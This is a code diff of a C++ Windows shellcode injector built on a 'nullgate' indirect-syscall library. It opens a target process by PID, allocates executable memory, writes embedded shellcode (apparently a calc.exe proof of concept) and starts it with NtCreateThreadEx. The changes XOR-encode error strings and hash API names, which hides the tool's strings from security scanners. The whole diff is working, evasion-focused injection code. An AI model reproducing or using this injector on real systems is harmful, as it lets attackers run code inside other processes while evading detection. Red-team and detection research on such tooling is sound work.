@@ -30,7 +30,8 @@ int main(int argc, char *argv[]) {
       "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
       "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
   if (argc != 2)
-    throw std::runtime_error("Wrong arg count\n");
+    throw std::runtime_error(
+        nullgate::hashing::xorDecode("ERQeIVR6MEQ/akg8PC01LCg="));
 
   nullgate::syscalls syscalls;
   DWORD PID = std::stoi(argv[1]);
@@ -38,49 +39,54 @@ int main(int argc, char *argv[]) {
   OBJECT_ATTRIBUTES objectAttrs = {sizeof(objectAttrs), NULL};
   CLIENT_ID clientId = {.UniqueProcess = (HANDLE)PID, .UniqueThread = NULL};
   auto status =
-      syscalls.Call(nullgate::fnv1Const("NtOpenProcess"), &processHandle,
-                    PROCESS_ALL_ACCESS, objectAttrs, clientId);
+      syscalls.Call(nullgate::hashing::fnv1Const("NtOpenProcess"),
+                    &processHandle, PROCESS_ALL_ACCESS, objectAttrs, clientId);
   if (!NT_SUCCESS(status))
     throw std::runtime_error(
-        "Couldn't get a handle on the process, failed with: " +
+        nullgate::hashing::xorDecode("BQkEI1c0dkJ4LU4naSJhGCcIFSNWej5YeD5DNmkzM"
+                                     "x8lAwI8H3o3VzEmTjdpNCgELlxR") +
         std::to_string(status));
 
   PVOID buf = NULL;
   size_t regionSize = sizeof(shellcode);
-  status = syscalls.Call(nullgate::fnv1Const("NtAllocateVirtualMemory"),
-                         processHandle, &buf, 0, &regionSize,
-                         MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  status = syscalls.Call(
+      nullgate::hashing::fnv1Const("NtAllocateVirtualMemory"), processHandle,
+      &buf, 0, &regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   if (!NT_SUCCESS(status)) {
-    syscalls.Call(nullgate::fnv1Const("NtClose"), processHandle);
+    syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
     throw std::runtime_error(
-        "Couldn't get reserve memory in the process, failed with: " +
+        nullgate::hashing::xorDecode("BQkEI1c0dkJ4LU4naTEkAyMUByoTNzRbNzhScyAtY"
+                                     "QQuA1E/QTUyUys5B3MvIigcIwJROFouOQx4") +
         std::to_string(status));
   }
 
-  status =
-      syscalls.Call(nullgate::fnv1Const("NtWriteVirtualMemory"), processHandle,
-                    buf, (void *)&shellcode, sizeof(shellcode), NULL);
+  status = syscalls.Call(nullgate::hashing::fnv1Const("NtWriteVirtualMemory"),
+                         processHandle, buf, (void *)&shellcode,
+                         sizeof(shellcode), NULL);
   if (!NT_SUCCESS(status)) {
-    syscalls.Call(nullgate::fnv1Const("NtClose"), processHandle);
-    throw std::runtime_error(
-        "Couldn't get write memory in to the process, failed with: " +
-        std::to_string(status));
+    syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
+    throw std::runtime_error(nullgate::hashing::xorDecode(
+                                 "BQkEI1c0dkJ4LU4naTQzGTIDUSJWNz5EIWpCPWk3LlAyD"
+                                 "hRvQyg+VT05WH9pJSAZKgMVb0QzJV5iag==") +
+                             std::to_string(status));
   }
 
   HANDLE threadHandle = NULL;
-  status = syscalls.Call(nullgate::fnv1Const("NtCreateThreadEx"), &threadHandle,
-                         THREAD_ALL_ACCESS, &objectAttrs, processHandle, buf,
-                         NULL, 0, 0, 0, 0, NULL);
+  status = syscalls.Call(nullgate::hashing::fnv1Const("NtCreateThreadEx"),
+                         &threadHandle, THREAD_ALL_ACCESS, &objectAttrs,
+                         processHandle, buf, NULL, 0, 0, 0, 0, NULL);
   if (!NT_SUCCESS(status)) {
-    syscalls.Call(nullgate::fnv1Const("NtClose"), processHandle);
-    throw std::runtime_error(
-        "Couldn't get create handle in the the process, failed with: " +
-        std::to_string(status));
+    syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
+    throw std::runtime_error(nullgate::hashing::xorDecode(
+                                 "BQkEI1c0dkJ4LU4naSAzFScSFG9bOz9SNC8LOidjNRgjR"
+                                 "gUnVnohRDcpTiA6b2EWJw8dKld6Jl8sIhFz") +
+                             std::to_string(status));
   }
 
-  syscalls.Call(nullgate::fnv1Const("NtWaitForSingleObject"), threadHandle,
-                INFINITE);
+  syscalls.Call(nullgate::hashing::fnv1Const("NtWaitForSingleObject"),
+                threadHandle, INFINITE);
 
-  syscalls.Call(nullgate::fnv1Const("NtClose"), threadHandle);
-  status = syscalls.Call(nullgate::fnv1Const("NtClose"), processHandle);
+  syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), threadHandle);
+  status =
+      syscalls.Call(nullgate::hashing::fnv1Const("NtClose"), processHandle);
 }
